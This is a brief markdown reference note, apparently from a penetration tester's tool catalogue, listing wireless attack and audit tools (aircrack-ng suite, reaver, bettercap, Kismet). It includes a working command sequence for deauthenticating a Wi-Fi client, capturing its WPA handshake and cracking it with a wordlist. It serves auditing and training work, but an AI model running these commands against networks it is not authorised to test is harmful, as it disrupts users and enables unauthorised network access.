# 06 - Tools / Systems / Programs (Hacking Wireless Networks)

**Purpose:** Attacks and auditing of wireless networks (Wi‑Fi).

**Tools mapped from your list:**
- `aircrack-ng` — capture and crack WPA/WPA2 handshakes and WEP keys.  
  Workflow examples: `airmon-ng` → `airodump-ng` → `aireplay-ng` → `aircrack-ng`

**Added recommended wireless tools:**
- `airmon-ng`, `airodump-ng`, `aireplay-ng` (aircrack-ng suite)  
- `reaver`, `wash` (WPS attacks)  
- `Kismet` — wireless discovery/sniffing
- `bettercap` — active network attacks and Wi-Fi MITM (in scope)

**Quick example (handshake capture):**
```bash
# put interface into monitor mode
airmon-ng start wlan0
# capture nearby networks and clients
airodump-ng wlan0mon --write capture
# deauth a client to capture handshake (use only in lab/scoped tests)
aireplay-ng --deauth 5 -a <BSSID> wlan0mon
# crack the handshake with a wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```